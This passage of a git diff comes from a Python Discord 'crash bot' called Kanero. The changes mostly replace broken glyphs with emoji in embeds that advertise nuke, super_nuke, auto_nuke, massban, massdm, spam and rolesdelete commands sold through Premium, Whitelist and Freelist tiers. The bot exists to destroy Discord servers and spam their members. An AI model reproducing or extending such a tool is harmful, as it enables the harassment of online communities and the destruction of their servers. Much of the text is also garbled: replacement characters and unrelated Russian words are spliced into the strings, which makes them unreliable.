             "� �подписка истекла���� ��� � ��подписка истекла�� �������\n"
             "� ������ �� ����-����� �� подписка истекла\n"
             "� навсегда��� ���� ����� ����� (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
             "� ����� � OWNER_ID � ��подписка истекла��\n"
             "� `!help` � `!changelog` навсегда ��� ���� �� ����� �������\n"
-            "� `!setup` � `!setup_update` навсегда����� ������ ���� ?? Guest\n"
+            "� `!setup` � `!setup_update` навсегда����� ������ ���� 🤖 Guest\n"
             "� `!compensate` � �����все параллельно �� навсегда� ����"
         ),
         inline=False
     )
     embed.add_field(
-        name="?? v2.4 � �����, навсегда, INFO",
+        name="🤖 v2.4 � �����, навсегда, INFO",
         value=(
             "� ����� навсегда ����� ���� � ������� � навсегда�����\n"
             "� навсегда� INFO � #info � #changelog\n"
@@ -4669,7 +4670,7 @@ async def changelogall(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd  |  ������� ������: v2.3")
+    embed.set_footer(text="🤖 Kanero  |  discord.gg/aud6wwYVRd  |  ������� ������: v2.3")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
@@ -4843,7 +4844,7 @@ async def on_member_remove(member):
                         f"{invite_url}"
                     ),
                     color=0x0a0a0a
-                ).set_footer(text="?? Kanero  |  davaidkatt")
+                ).set_footer(text="🤖 Kanero  |  davaidkatt")
             )
         except Exception:
             pass
@@ -4992,7 +4993,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
         # nuke
         if cmd_name == "nuke":
             if nuke_running.get(guild.id):
-                await message.channel.send("?? ��� навсегда.")
+                await message.channel.send("🤖 ��� навсегда.")
                 return
             nuke_running[guild.id] = True
             nuke_starter[guild.id] = message.author.id
@@ -5126,7 +5127,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     except Exception:
                         lines.append(f"`{uid}` � *�� ������*")
                 embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"?? Kanero  |  �����: {len(config.WHITELIST)}")
+                embed.set_footer(text=f"🤖 Kanero  |  �����: {len(config.WHITELIST)}")
                 await message.channel.send(embed=embed)
 
         elif cmd_name == "inv":
@@ -5148,7 +5149,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"?? ������ {name_str} навсегда����.")
+                await message.channel.send(f"🤖 ������ {name_str} навсегда����.")
             else:
                 await message.channel.send("������ �все параллельно�.")
 
@@ -5166,7 +5167,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"?? ������ {name_str} навсегда�����.")
+                await message.channel.send(f"🤖 ������ {name_str} навсегда�����.")
             else:
                 await message.channel.send("������ �� �все параллельно�.")
 
@@ -5181,7 +5182,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 for gid in BLOCKED_GUILDS:
                     g = bot.get_guild(gid)
                     lines.append(f"`{gid}` � {g.name if g else '����������'}")
-                await message.channel.send("?? �������подписка истекла:\n" + "\n".join(lines))
+                await message.channel.send("🤖 �������подписка истекла:\n" + "\n".join(lines))
 
         elif cmd_name == "pm_add":
             if message.author.id != config.OWNER_ID:
@@ -5195,7 +5196,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 if uid not in config.WHITELIST:
                     config.WHITELIST.append(uid)
                     save_whitelist()
-                await message.channel.send(f"?? `{uid}` ������� **Premium** + навсегда � **Whitelist**.")
+                await message.channel.send(f"🤖 `{uid}` ������� **Premium** + навсегда � **Whitelist**.")
             except ValueError:
                 await message.channel.send("�������������: `!pm_add <id>`")
 
@@ -5228,8 +5229,8 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                         lines.append(f"`{uid}` � **{user}**")
                     except Exception:
                         lines.append(f"`{uid}` � *�� ������*")
-                embed = discord.Embed(title="?? Premium ������", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"?? Kanero  |  �����: {len(PREMIUM_LIST)}")
+                embed = discord.Embed(title="🤖 Premium ������", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"🤖 Kanero  |  �����: {len(PREMIUM_LIST)}")
                 await message.channel.send(embed=embed)
 
         elif cmd_name == "unban":
@@ -5248,7 +5249,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     except Exception:
                         failed += 1
                 embed = discord.Embed(
-                    title="?? ������ навсегда",
+                    title="🤖 ������ навсегда",
                     description=f"������������: **{user}** (`{uid}`)\n? навсегда �� **{unbanned}** навсегда\n? �� ������� �� **{failed}** навсегда",
                     color=0x0a0a0a
                 )
@@ -5284,7 +5285,7 @@ async def on_message(message):
             is_fl = is_freelisted(uid)
 
             embed = discord.Embed(
-                title="?? Kanero � CRASH BOT",
+                title="🤖 Kanero � CRASH BOT",
                 description=(
                     "```\n"
                     "  ------�------�  -----� -------�--�  --�\n"
@@ -5298,19 +5299,19 @@ async def on_message(message):
                 color=0x0a0a0a
             )
             if is_owner:
-                access_str = "?? **OWNER** � ������ ������ ☠️ КРАШ СЕРВЕРА"
+                access_str = "🤖 **OWNER** � ������ ������ ☠️ КРАШ СЕРВЕРА"
             elif is_prem:
-                access_str = "?? **PREMIUM** � навсегда��� ������"
+                access_str = "🤖 **PREMIUM** � навсегда��� ������"
             elif is_wl:
                 access_str = "? **Whitelist** � ������� �������"
             elif is_fl:
-                access_str = "?? **Freelist** � ������� ������ (������� � #addbot)"
+                access_str = "🤖 **Freelist** � ������� ������ (������� � #addbot)"
             else:
                 access_str = "? **��� �������** � ������ � #addbot: https://discord.gg/nNTB37QNCG"
 
-            embed.add_field(name="?? ���� ������� �������", value=access_str, inline=False)
+            embed.add_field(name="🤖 ���� ������� �������", value=access_str, inline=False)
             embed.add_field(
-                name="?? FREELIST (������ � #addbot � навсегда�)",
+                name="🤖 FREELIST (������ � #addbot � навсегда�)",
                 value=(
                     "`!nuke` � ���� �������\n"
                     "`!auto_nuke on/off/info` � ����-���� ��� ����� ����\n"
@@ -5330,9 +5331,9 @@ async def on_message(message):
                 inline=False
             )
             embed.add_field(
-                name="??"💎 Premium",
+                name="💎 Premium",
                 value=(
-                    "`!nuke [�����]` � ��� �� ����� �������\n"
+                    "`!nuke [текст]` – нук со своим текстом\n"
                     "`!super_nuke [�����]` � ��� + ��� �� 15 навсегда��\n"
                     "`!massban` � `!massdm` � `!spam` � `!pingspam`\n"
                     "`!rolesdelete` � `!serverinfo` � `!userinfo`\n"
@@ -5352,11 +5353,11 @@ async def on_message(message):
                 inline=False
             )
             embed.add_field(
-                name="?? ������ навсегда",
+                name="🤖 ������ навсегда",
                 value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                 inline=False
             )
-            embed.set_footer(text="?? Kanero  |  !changelog � ������� навсегда��")
+            embed.set_footer(text="🤖 Kanero  |  !changelog – все обновления")
             embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await message.channel.send(embed=embed)
             return
@@ -5386,12 +5387,12 @@ async def on_message(message):
                     " L-----�---L--�--L--�----�-L---�-------�--�----�\n"
                     " -L====-----L=----L=---L=---L==-L======-L=---L=-\n"
                     "```\n"
-                    "> ?? ������ �� ������ ������ � ����� ����."
+                    "> 🤖 ������ �� ������ ������ � ����� ����."
                 ),
                 color=0x0a0a0a
             )
             embed.add_field(
-                name="??? �������",
+                name="📊 �������",
                 value=(
                     "`!guilds` � ������ навсегда ���� (������ ������)\n"
                     "`!setguild <id>` � ������� ������ �� ID\n"
@@ -5411,9 +5412,9 @@ async def on_message(message):
                 inline=False
             )
             embed.add_field(
-                name="??"💎 Premium",
+                name="💎 Premium",
                 value=(
-                    "��� ���подписка истекла����� `!nuke [���� �����]`.\n\n"
+                    "Все команды Whitelist + `!nuke [свой текст]`.\n\n"
                     "`!pm_add <id>` � ������ Premium\n"
                     "`!pm_remove <id>` � ������� Premium\n"
                     "`!pm_list` � ������ Premium навсегда�����"
@@ -5421,7 +5422,7 @@ async def on_message(message):
                 inline=False
             )
             embed.add_field(
-                name="?? ����� ����",
+                name="🤖 ����� ����",
                 value=(
                     "��������� ����� �����все параллельно� ��� `!nuke` ��� навсегда��.\n\n"
                     "`!set_spam_text <�����>` � ������� �����\n"
@@ -5430,7 +5431,7 @@ async def on_message(message):
                 inline=False
             )
             embed.add_field(
-                name="?? ��подписка истекла�",
+                name="🤖 ��подписка истекла�",
                 value=(
                     "�������☠️ КРАШ СЕРВЕРА �� ������� � ����� �� навсегда� �� ������ все параллельно���� ���.\n\n"
                     "`!block_guild <id>` � навсегда�����\n"
@@ -5440,7 +5441,7 @@ async def on_message(message):
                 inline=False
             )
             embed.add_field(
-                name="?? OWNER WHITELIST",
+                name="🤖 OWNER WHITELIST",
                 value=(
                     "`!owl_add <id>` � навсегда\n"
                     "`!owl_remove <id>` � ������\n"
@@ -5449,7 +5450,7 @@ async def on_message(message):
                 inline=False
             )
             embed.add_field(
-                name="??? ������ (����������)",
+                name="📊 ������ (����������)",
                 value=(
                     "`!wl_add <id>` � ������ ������\n"
                     "`!wl_remove <id>` � ������� ������\n"
@@ -5457,7 +5458,7 @@ async def on_message(message):
                 ),
                 inline=False
             )
-            embed.set_footer(text="?? Kanero  |  v2.0  |  ������� навсегда ������ � ��")
+            embed.set_footer(text="🤖 Kanero  |  v2.0  |  Краш-бот для Discord")
             embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await message.channel.send(embed=embed)
             return
@@ -5511,8 +5512,8 @@ async def on_message(message):
                         lines.append(f"`{uid}` � **{user}**")
                     except Exception:
                         lines.append(f"`{uid}` � *�� ������*")
-                embed = discord.Embed(title="?? Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"?? Kanero  |  �����: {len(config.OWNER_WHITELIST)}")
+                embed = discord.Embed(title="🤖 Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"🤖 Kanero  |  �����: {len(config.OWNER_WHITELIST)}")
                 await message.channel.send(embed=embed)
             return
 
@@ -5584,7 +5585,7 @@ async def on_message(message):
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"?? ������ {name_str} навсегда����. ��� �� ����� �подписка истекла �� ���.")
+                await message.channel.send(f"🤖 ������ {name_str} навсегда����. ��� �� ����� �подписка истекла �� ���.")
             else:
                 await message.channel.send("������ �все параллельно�.")
             return
@@ -5608,7 +5609,7 @@ async def on_message(message):
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"?? ������ {name_str} навсегда�����.")
+                await message.channel.send(f"🤖 ������ {name_str} навсегда�����.")
             else:
                 await message.channel.send("������ �� �все параллельно�.")
             return
@@ -5625,7 +5626,7 @@ async def on_message(message):
                 for gid in BLOCKED_GUILDS:
                     g = bot.get_guild(gid)
                     lines.append(f"`{gid}` � {g.name if g else '����������'}")
-                await message.channel.send("?? �������подписка истекла:\n" + "\n".join(lines))
+                await message.channel.send("🤖 �������подписка истекла:\n" + "\n".join(lines))
             return
 
         # !pm_add <id> � ������ premium (������ OWNER_ID)
@@ -5645,7 +5646,7 @@ async def on_message(message):
             if uid not in PREMIUM_LIST:
                 PREMIUM_LIST.append(uid)
                 save_premium()
-                await message.channel.send(f"?? `{uid}` ������� **Premium** � навсегда� ����� ��� `!nuke` навсегда�����.")
+                await message.channel.send(f"🤖 `{uid}` ������� **Premium** � навсегда� ����� ��� `!nuke` навсегда�����.")
             else:
                 await message.channel.send("��� � Premium.")
             return
@@ -5687,8 +5688,8 @@ async def on_message(message):
                         lines.append(f"`{uid}` � **{user}**")
                     except Exception:
                         lines.append(f"`{uid}` � *�� ������*")
-                embed = discord.Embed(title="?? Premium ������", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"?? Kanero  |  �����: {len(PREMIUM_LIST)}")
+                embed = discord.Embed(title="🤖 Premium ������", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"🤖 Kanero  |  �����: {len(PREMIUM_LIST)}")
                 await message.channel.send(embed=embed)
             return
 
@@ -5736,7 +5737,7 @@ async def on_message(message):
         try:
             await message.author.send(
                 embed=discord.Embed(
-                    description="?? ������� �� ����� ������� �� навсегда.\n������ ���� �� ���� ������ � навсегда� ���.",
+                    description="🤖 ������� �� ����� ������� �� навсегда.\n������ ���� �� ���� ������ � навсегда� ���.",
                     color=0x0a0a0a
                 ).set_footer(text="🤖 Kanero")
             )
@@ -5772,7 +5773,7 @@ async def on_message(message):
         else:
             FREELIST.append(uid)
             save_freelist()
-            # ����� ���� ?? User �� подписка истекла
+            # ����� ���� 🤖 User �� подписка истекла
             try:
                 home_guild = bot.get_guild(HOME_GUILD_ID)
                 if home_guild:
@@ -5780,7 +5781,7 @@ async def on_message(message):
                     if not member:
                         member = await home_guild.fetch_member(uid)
                     if member:
-                        user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
+                        user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
                         if user_role:
                             await member.add_roles(user_role, reason="Freelist � ������� � addbot")
             except Exception:
@@ -5790,7 +5791,7 @@ async def on_message(message):
                     embed=discord.Embed(
                         title="? ������� ������ �������!",
                         description=(
-                            "�� навсегда � freelist � ������� ���� **?? User**.\n\n"
+                            "�� навсегда � freelist � ������� ���� **🤖 User**.\n\n"
                             "**�подписка истекла:**\n"
                             "`!nuke` � ���� �������\n"
                             "`!auto_nuke on/off` � ����-���� ��� ����� ����\n"
@@ -5934,7 +5935,7 @@ async def on_command_error(ctx, error):
         cmd = ctx.command
         if cmd.name == "compensate":
             await ctx.send(
-                "? **подписка истекла�.**\n"
+                "🤖 **подписка истекла�.**\n"
                 "���������: `!compensate @user wl/pm/fl 2d`\n"
                 "**����:** `wl` � `pm` � `fl`\n"
                 "**�����:** `2d` � `48h` � `24`"
@@ -5947,11 +5948,14 @@ async def on_command_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         return  # ����� навсегда�� � �� �все параллельно�
 
-    # навсегда� ������ � навсегда �� �� ������
+    # Обработка ошибок команд
     if isinstance(error, commands.CommandInvokeError):
         original = error.original
         cmd_name = ctx.command.name if ctx.command else "?"
-        await ctx.send(f"? ������ ��� навсегда�� `!{cmd_name}`: `{type(original).__name__}: {original}`")
+        try:
+            await ctx.send(f"❌ Ошибка при выполнении `!{cmd_name}`: `{type(original).__name__}: {original}`")
+        except:
+            pass  # Если канал не существует, просто игнорируем
         return
 
 
